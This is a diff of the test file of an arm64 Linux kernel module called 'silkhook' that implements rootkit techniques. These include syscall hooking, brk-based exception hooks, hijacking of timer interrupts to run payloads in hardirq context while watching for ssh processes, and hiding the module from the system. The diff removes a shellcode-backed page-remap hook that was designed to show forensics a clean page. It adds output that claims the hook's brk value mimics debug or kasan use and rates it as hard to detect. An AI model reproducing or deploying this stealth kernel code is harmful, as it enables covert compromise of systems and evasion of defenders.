@@ -23,25 +23,18 @@
 #include "platform/kernel/shadow.h"
 #include "platform/kernel/elb.h"
 #include "platform/kernel/ich.h"
-#include "platform/kernel/apr.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("vmsplit");
 MODULE_DESCRIPTION("silkhook test");
 
 
-static struct delayed_work        setup_work;
+static struct delayed_work setup_work;
 static struct silkhook_svc_hook   __svc_hook;
 static struct silkhook_hidden_mod __hidden;
 static struct silkhook_elb_hook   __elb_hook;
 static struct silkhook_ich_hook   __ich_hook;
-static struct silkhook_apr_hook   __apr_hook;
 static unsigned int               __trigger_count;
-
-static uint32_t apr_shellcode[] = {
-    0xd280a720,   /*  mov x0, #0x539 (1337)  */
-    0xd65f03c0,   /*  ret                    */
-};
 
 
 /* ─────────────────────────────────────────────────────────────────────────────
@@ -65,7 +58,7 @@ asmlinkage long hooked_getuid(void)
  * ───────────────────────────────────────────────────────────────────────────── */
 
 static unsigned int __elb_count;
-static int __elb_stack_dumped;
+static int __elb_stack_dumped = 0;
 
 static void elb_test_handler(struct pt_regs *regs, struct silkhook_elb_hook *ctx)
 {
@@ -75,8 +68,8 @@ static void elb_test_handler(struct pt_regs *regs, struct silkhook_elb_hook *ctx
     {
         __elb_stack_dumped = 1;
         pr_info("silkhook: --------------------------------------------\n");
-        pr_info("silkhook:   [elb] callstack proof\n");
-        pr_info("silkhook:   [elb] proving hook runs in exception path:\n");
+        pr_info("silkhook:   [elb]  callstack proof\n");
+        pr_info("silkhook:   [elb]  proving hook runs in exception path:\n");
         pr_info("silkhook: --------------------------------------------\n");
         dump_stack();
         pr_info("silkhook: --------------------------------------------\n");
@@ -89,9 +82,10 @@ static void elb_test_handler(struct pt_regs *regs, struct silkhook_elb_hook *ctx
 
 
 /* ─────────────────────────────────────────────────────────────────────────────
- * ich hook test (interrupt coalescing hijack)
+ * ich hook test
  *
  * runs from hardirq ctx on timer interrupt
+ * fires every ~1 sec (coalesce=256 @ 250Hz)
  * ───────────────────────────────────────────────────────────────────────────── */
 
 static unsigned int __ich_exec_count;
@@ -102,6 +96,8 @@ static void ich_test_payload(struct pt_regs *regs, struct silkhook_ich_hook *ctx
 
     __ich_exec_count++;
 
+    /*  we're in hardirq ctx,  we can inspect any running task
+     *  this fires regardless of what userspace is doing in the moment  */
     if (__ich_exec_count % 10 == 1)
     {
         pr_info("silkhook: [ich] tick !! cpu=%u pid=%d comm=%s\n",
@@ -110,6 +106,8 @@ static void ich_test_payload(struct pt_regs *regs, struct silkhook_ich_hook *ctx
                 task->comm);
     }
 
+    /*  e.g.: detect aspecific process
+     *        here i attempt watching for ssh  */
     if (strncmp(task->comm, "ssh", 3) == 0)
     {
         if (__ich_exec_count % 50 == 1)
@@ -119,25 +117,7 @@ static void ich_test_payload(struct pt_regs *regs, struct silkhook_ich_hook *ctx
 
 
 /* ─────────────────────────────────────────────────────────────────────────────
- * apr hook test (asynchronous page remap)
- *
- * replaces getppid with shadow page version
- * ───────────────────────────────────────────────────────────────────────────── */
-
-// static unsigned int __apr_count = 0;
-
-/*
- * replacement getppid
- * lives in shadow page, executes instead of real getppid
- */
-// static asmlinkage long apr_hooked_getppid(const struct pt_regs *regs)
-// {
-//     return 1337;
-// }
-
-
-/* ─────────────────────────────────────────────────────────────────────────────
- * /proc/silkhook_debug - elb proof
+ * /proc/silkhook_debug
  * ───────────────────────────────────────────────────────────────────────────── */
 
 static int silkhook__debug_show(struct seq_file *m, void *v)
@@ -180,13 +160,13 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     for (i = 0; i < 5; i++)
     {
         uint32_t ins = hook_site[i];
-
         if ((ins & 0xFF800000) == 0xD2800000)
             has_movz++;
-        if ((ins >> 23) == (0xF28 >> 1) ||
-            (ins >> 23) == (0xF2A >> 1) ||
-            (ins >> 23) == (0xF2C >> 1) ||
-            (ins >> 23) == (0xF2E >> 1))
+        /*  check upper 9 bits instead  */
+        if ((ins >> 23) == (0xF28 >> 1) ||   /*  movk lsl #0   */
+            (ins >> 23) == (0xF2A >> 1) ||   /*  movk lsl #16  */
+            (ins >> 23) == (0xF2C >> 1) ||   /*  movk lsl #32  */
+            (ins >> 23) == (0xF2E >> 1))     /*  movk lsl #48  */
             has_movz++;
         if ((ins & 0xFFFFFC1F) == 0xD61F0000)
             has_br++;
@@ -196,9 +176,9 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     seq_printf(m, "    br found:          %d\n", has_br);
 
     if (has_movz < 2 && has_br == 0)
-        seq_puts(m, "    result:            GOOD - no shellcode pattern!!\n\n");
+        seq_puts(m, "    result:          GOOD - no shellcode pattern!!\n\n");
     else
-        seq_puts(m, "    result:            BAD - jump seq detected\n\n");
+        seq_puts(m, "    result:          BAD - jump seq detected\n\n");
 
     seq_puts(m, "[3] brk instr analysis\n");
     seq_puts(m, "    -------------------------------------------------------\n");
@@ -206,16 +186,27 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
     if ((instr & 0xFFE0001F) == 0xD4200000)
     {
         uint16_t imm = (instr >> 5) & 0xFFFF;
-
         seq_printf(m, "    encoding:      brk #0x%04x\n", imm);
         seq_printf(m, "    opcode mask:   %08x & FFE0001F = D4200000 [GOOD]\n", instr);
         seq_puts(m, "    result:        GOOD - valid brk instr\n\n");
-    }
-    else {
+    } else {
         seq_puts(m, "    result:        BAD\n\n");
     }
 
-    seq_puts(m, "[4] mem dump @ hook-site\n");
+    seq_puts(m, "[4] brk integrity\n");
+    seq_puts(m, "    -------------------------------------------------------\n");
+    seq_puts(m, "    kernel brk imm vals:\n");
+    seq_puts(m, "      0x0004       kprobes single-step\n");
+    seq_puts(m, "      0x0005       kprobes breakpoint\n");
+    seq_puts(m, "      0x0006       uprobes breakpoint\n");
+    seq_puts(m, "      0x0400       kgdb breakpoint\n");
+    seq_puts(m, "      0x0800       BUG()  macro\n");
+    seq_puts(m, "      0x09xx       WARN() macro\n");
+    seq_puts(m, "      0x5xxx       kasan\n");
+    seq_printf(m, "      0x%04x       silkhook  <--  (our hook)\n", SILKHOOK_BRK_IMM);
+    seq_puts(m, "    result:        GOOD - should look like debug / kasan use\n\n");
+
+    seq_puts(m, "[5] mem dump @ hook-site\n");
     seq_puts(m, "    -------------------------------------------------------\n");
     for (i = 0; i < 8; i++)
     {
@@ -225,6 +216,15 @@ static int silkhook__debug_show(struct seq_file *m, void *v)
         else
             seq_puts(m, "\n");
     }
+
+    seq_puts(m, "\n[6] compare:  elb vs inline hook\n");
+    seq_puts(m, "    -------------------------------------------------------\n");
+    seq_puts(m, "    technique        bytes   pattern             detectable\n");
+    seq_puts(m, "    -------------------------------------------------------\n");
+    seq_puts(m, "    inline  (ldr+br) 16      ldr x16,[pc,#8];br  high\n");
+    seq_puts(m, "    inline  (mov+br) 20      movz;movk;movk;br   high\n");
+    seq_puts(m, "    elb  (brk)       4       brk #imm            low\n");
+    seq_puts(m, "    -------------------------------------------------------\n");
 
     return 0;
 }
@@ -243,7 +243,7 @@ static const struct proc_ops silkhook_debug_ops = {
 
 
 /* ─────────────────────────────────────────────────────────────────────────────
- * /proc/silkhook_ich - ich stats
+ * /proc/silkhook_ich  (stats n stuff)
  * ───────────────────────────────────────────────────────────────────────────── */
 
 static int silkhook__ich_debug_show(struct seq_file *m, void *v)
@@ -256,7 +256,7 @@ static int silkhook__ich_debug_show(struct seq_file *m, void *v)
 
     if (!__ich_hook.installed)
     {
-        seq_puts(m, "[!]  ich hook NOT installed\n");
+        seq_puts(m, "[!]  ich hook NOT installed...\n");
         return 0;
     }
 
@@ -265,22 +265,22 @@ static int silkhook__ich_debug_show(struct seq_file *m, void *v)
     seq_puts(m, "┌─────────────────────────────────────────┐\n");
     seq_puts(m, "│ config                                  │\n");
     seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_printf(m, "│ targ:     %px                │\n",           __ich_hook.targ);
-    seq_printf(m, "│ orig instr: %08x                    │\n",    __ich_hook.orig_instr);
+    seq_printf(m, "│ targ:     %px              │\n",             __ich_hook.targ);
+    seq_printf(m, "│ orig instr: %08x                    │\n",   __ich_hook.orig_instr);
     seq_printf(m, "│ coalesce:   every %4u irqs             │\n", __ich_hook.coalesce_n);
     seq_printf(m, "│ jitter:     %u-%u cycles                │\n",
                __ich_hook.jitter_min, __ich_hook.jitter_max);
     seq_puts(m, "└─────────────────────────────────────────┘\n\n");
 
     seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│ runtime stats                           │\n");
+    seq_puts(m, "│ runtime statistics                      │\n");
     seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_printf(m, "│ execs:      %8llu                    │\n", exec);
+    seq_printf(m, "│ execs: %8llu                         │\n", exec);
     seq_printf(m, "│ skipped:    %8llu                    │\n", skip);
     seq_printf(m, "│ total cyc:  %8llu                    │\n", cycles);
     if (exec > 0)
         seq_printf(m, "│ avg cycles: %8llu                    │\n", cycles / exec);
-    seq_puts(m, "└─────────────────────────────────────────┘\n");
+    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
 
     return 0;
 }
@@ -292,65 +292,6 @@ static int silkhook__ich_debug_open(struct inode *inode, struct file *file)
 
 static const struct proc_ops silkhook_ich_debug_ops = {
     .proc_open    = silkhook__ich_debug_open,
-    .proc_read    = seq_read,
-    .proc_lseek   = seq_lseek,
-    .proc_release = single_release,
-};
-
-
-/* ─────────────────────────────────────────────────────────────────────────────
- * /proc/silkhook_apr - apr stats
- * ───────────────────────────────────────────────────────────────────────────── */
-
-static int silkhook__apr_debug_show(struct seq_file *m, void *v)
-{
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│           silkhook apr stats            │\n");
-    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    if (!__apr_hook.installed)
-    {
-        seq_puts(m, "[!] apr hook NOT installed\n");
-        return 0;
-    }
-
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│ config                                  │\n");
-    seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_printf(m, "│ targ:     %px                │\n", __apr_hook.targ);
-    seq_printf(m, "│ shadow:     %px              │\n", __apr_hook.shadow);
-    seq_printf(m, "│ orig_pfn:   %lx                      │\n", __apr_hook.pfn_orig);
-    seq_printf(m, "│ hook_pfn:   %lx                      │\n", __apr_hook.pfn_hook);
-    seq_printf(m, "│ active:     %s                         │\n",
-               __apr_hook.active ? "yes" : "no");
-    seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    // seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    // seq_puts(m, "│ runtime stats                           │\n");
-    // seq_puts(m, "├─────────────────────────────────────────┤\n");
-    // seq_printf(m, "│ executions: %8u                    │\n", __apr_count);
-    // seq_puts(m, "└─────────────────────────────────────────┘\n\n");
-
-    seq_puts(m, "┌─────────────────────────────────────────┐\n");
-    seq_puts(m, "│ technique                               │\n");
-    seq_puts(m, "├─────────────────────────────────────────┤\n");
-    seq_puts(m, "│ • two physical pages, one VA            │\n");
-    seq_puts(m, "│ • swap via PTE pfn manipulation         │\n");
-    seq_puts(m, "│ • atomic enable/disable                 │\n");
-    seq_puts(m, "│ • no code patching                      │\n");
-    seq_puts(m, "│ • forensics: can show clean page        │\n");
-    seq_puts(m, "└─────────────────────────────────────────┘\n");
-
-    return 0;
-}
-
-static int silkhook__apr_debug_open(struct inode *inode, struct file *file)
-{
-    return single_open(file, silkhook__apr_debug_show, NULL);
-}
-
-static const struct proc_ops silkhook_apr_debug_ops = {
-    .proc_open    = silkhook__apr_debug_open,
     .proc_read    = seq_read,
     .proc_lseek   = seq_lseek,
     .proc_release = single_release,
@@ -400,14 +341,13 @@ static void do_silkhook_setup(struct work_struct *work)
     if (targ)
     {
         r = silkhook__elb_install(&__elb_hook, targ, elb_test_handler, NULL);
-        if (r == SILKHOOK_OK)
-            proc_create("silkhook_debug", 0444, NULL, &silkhook_debug_ops);
-        else
+        proc_create("silkhook_debug", 0444, NULL, &silkhook_debug_ops);
+        if (r != SILKHOOK_OK)
             pr_err("silkhook: elb install failure: %d\n", r);
     }
 
 skip_elb:
-    /*  ich hook  */
+
     r = silkhook__ich_init();
     if (r != SILKHOOK_OK)
     {
@@ -417,11 +357,11 @@ skip_elb:
 
     {
         struct silkhook_ich_cfg ich_cfg = {
-            .coalesce_n  = 16,
-            .jitter_min  = 10,
-            .jitter_max  = 50,
-            .payload     = ich_test_payload,
-            .payload_ctx = NULL,
+            .coalesce_n   = 16,    /*  every 16th irq  */
+            .jitter_min   = 10,
+            .jitter_max   = 50,
+            .payload      = ich_test_payload,
+            .payload_ctx  = NULL,
         };
 
         r = silkhook__ich_install(&__ich_hook, &ich_cfg);
@@ -429,35 +369,12 @@ skip_elb:
         {
             proc_create("silkhook_ich", 0444, NULL, &silkhook_ich_debug_ops);
             pr_info("silkhook: ich ready !!!\n");
-        }
-        else {
+        } else {
             pr_err("silkhook: ich install failure: %d\n", r);
         }
     }
 
 skip_ich:
-    /*  apr hook  */
-    r = silkhook__apr_init();
-    if (r != SILKHOOK_OK)
-    {
-        pr_err("silkhook: apr init failure: %d\n", r);
-        goto skip_apr;
-    }
-
-    targ = silkhook_ksym("__arm64_sys_getppid");
-    if (targ) {
-        r = silkhook__apr_install(&__apr_hook, targ,
-                                    apr_shellcode, sizeof(apr_shellcode));
-        if (r == SILKHOOK_OK) {
-            silkhook__apr_enable(&__apr_hook);
-            proc_create("silkhook_apr", 0444, NULL, &silkhook_apr_debug_ops);
-            pr_info("silkhook: apr ready !!!\n");
-        } else {
-            pr_err("silkhook: apr install failure: %d\n", r);
-        }
-    }
-
-skip_apr:
     silkhook__hide_mod(THIS_MODULE, &__hidden);
 
     pr_info("silkhook: setup complete !!!\n");
@@ -473,26 +390,15 @@ static int __init silkhook_mod_init(void)
 
 static void __exit silkhook_mod_exit(void)
 {
-    remove_proc_entry("silkhook_apr", NULL);
     remove_proc_entry("silkhook_ich", NULL);
     remove_proc_entry("silkhook_debug", NULL);
-
     cancel_delayed_work_sync(&setup_work);
-
     silkhook__unhide_mod(&__hidden);
-
-    silkhook__apr_disable(&__apr_hook);
-    silkhook__apr_remove(&__apr_hook);
-    silkhook__apr_exit();
-
     silkhook__ich_remove(&__ich_hook);
     silkhook__ich_exit();
-
     silkhook__elb_remove(&__elb_hook);
     silkhook__elb_exit();
-
     silkhook__svc_remove(&__svc_hook);
-
     pr_info("silkhook: unloaded !!!\n");
 }
 
